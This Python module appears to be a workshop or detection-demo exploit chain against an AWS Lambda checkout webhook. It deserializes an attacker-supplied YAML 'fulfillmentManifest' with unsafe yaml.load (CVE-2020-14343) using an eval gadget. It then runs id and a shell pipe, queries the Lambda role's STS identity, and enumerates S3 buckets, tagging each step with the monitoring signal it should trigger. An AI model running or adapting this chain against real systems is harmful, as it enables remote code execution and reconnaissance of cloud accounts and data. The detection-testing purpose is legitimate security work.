"""Checkout fulfillment YAML exploit chain — AWS Lambda order-webhook."""
from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path
from typing import Any

WORKSHOP_MARKER = Path("/tmp/jss-order-yaml-chain.txt")
DEFAULT_YAML_PAYLOAD = "!!python/object/apply:builtins.eval\nargs: ['\"exploited\"']"


def _run_proc(cmd: list[str], timeout: float = 12) -> dict[str, Any]:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {
            "command": cmd,
            "returncode": proc.returncode,
            "stdout": proc.stdout.strip(),
            "stderr": proc.stderr.strip(),
        }
    except Exception as exc:
        return {"command": cmd, "returncode": None, "error": str(exc)}


def poisoned_manifest(body: dict) -> str | None:
    manifest = body.get("fulfillmentManifest") or body.get("shippingConfigYaml")
    if isinstance(manifest, str) and manifest.strip():
        return manifest
    return None


def exploit_yaml(payload: str) -> dict[str, Any]:
    import yaml

    try:
        result = yaml.load(payload, Loader=yaml.Loader)
        exploited = result == "exploited" or result is not None
        return {"success": True, "exploited": exploited, "result": str(result)}
    except Exception as exc:
        return {"success": False, "exploited": False, "error": str(exc)}


def _lambda_identity() -> dict[str, Any]:
    identity: dict[str, Any] = {}
    error = None
    try:
        import boto3

        sts = boto3.client("sts")
        identity = sts.get_caller_identity()
    except Exception as exc:
        error = str(exc)

    subprocess_probe = _run_proc(
        [
            "python3",
            "-c",
            "import boto3; print(boto3.client('sts').get_caller_identity())",
        ]
    )
    return {
        "step": 3,
        "action": "lambda_execution_role_probe",
        "scope": "lambda-runtime",
        "account": identity.get("Account"),
        "arn": identity.get("Arn"),
        "user_id": identity.get("UserId"),
        "error": error,
        "subprocess_sts_probe": subprocess_probe,
        "upwind": ["CloudTrail identity", "AWS credentials access"],
    }


def _s3_enumeration() -> dict[str, Any]:
    buckets: list[str] = []
    error = None
    try:
        import boto3

        s3 = boto3.client("s3")
        response = s3.list_buckets()
        buckets = [item["Name"] for item in response.get("Buckets", [])[:8]]
    except Exception as exc:
        error = str(exc)

    return {
        "step": 4,
        "action": "s3_enumeration",
        "region": os.getenv("AWS_REGION") or os.getenv("AWS_DEFAULT_REGION"),
        "buckets": buckets,
        "error": error,
        "upwind": ["CloudTrail S3 ListBuckets", "data exfiltration"],
    }


def run_checkout_chain(manifest: str) -> dict[str, Any]:
    chain: list[dict[str, Any]] = []

    yaml_result = exploit_yaml(manifest)
    chain.append(
        {
            "step": 1,
            "action": "yaml.load fulfillmentManifest in handle_checkout",
            "cve": "CVE-2020-14343",
            "pattern": "unsafe_deserialization",
            **yaml_result,
        }
    )

    id_step = _run_proc(["id", "-a"])
    marker_text = f"yaml-chain:{yaml_result.get('result')}\n{id_step.get('stdout', '')}\n"
    WORKSHOP_MARKER.write_text(marker_text, encoding="utf-8")
    chain.append(
        {
            "step": 2,
            "action": "post_exploit_identity_probe",
            "process": id_step,
            "marker_file": str(WORKSHOP_MARKER),
            "upwind": ["Process events (CloudWatch / runtime monitoring)"],
        }
    )

    shell_pipe = _run_proc(["sh", "-c", f"id 2>&1 | tee -a {WORKSHOP_MARKER}"])
    chain.append(
        {
            "step": 2,
            "action": "shell_pipe_redirect",
            "process": shell_pipe,
            "upwind": ["Shell spawn in Lambda"],
        }
    )

    chain.append(_lambda_identity())
    chain.append(_s3_enumeration())

    exploited = bool(yaml_result.get("exploited"))
    return {
        "exploited": exploited,
        "pattern": "checkout_fulfillment_yaml_chain",
        "cve": "CVE-2020-14343",
        "scope": "order-webhook-lambda",
        "chain": chain,
        "narrative": (
            "Attacker places an order with a poisoned fulfillmentManifest. "
            "Lambda checkout handler deserializes it with yaml.load(), runs id/shell, "
            "then abuses the overprivileged execution role to call STS and list S3 buckets."
        ),
        "upwind_policies": [
            "CVE-2020-14343 / unsafe deserialization",
            "CloudTrail identity",
            "CloudTrail S3 ListBuckets",
        ],
        "note": "Lambda has no Upwind tracer — rely on CloudTrail + CloudWatch for serverless signals.",
    }
